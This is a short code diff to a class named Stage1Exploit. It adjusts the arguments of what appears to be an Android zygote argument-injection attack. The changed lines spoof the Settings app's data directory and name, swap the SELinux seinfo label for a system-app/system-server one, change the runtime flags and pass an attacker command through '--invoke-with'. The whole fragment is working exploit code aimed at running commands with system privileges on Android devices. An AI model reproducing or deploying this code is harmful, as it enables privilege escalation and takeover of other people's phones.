@@ -196,8 +196,8 @@ class Stage1Exploit:
             "--app-data-dir=/data/user/0/com.android.settings",
             "--runtime-args",
             "--nice-name=settings",
-            "--seinfo=platform:privapp:complete",
-            "--runtime-flags=32767",
+            "--seinfo=platform:isSystemServer:system_app:complete",
+            "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
         ]
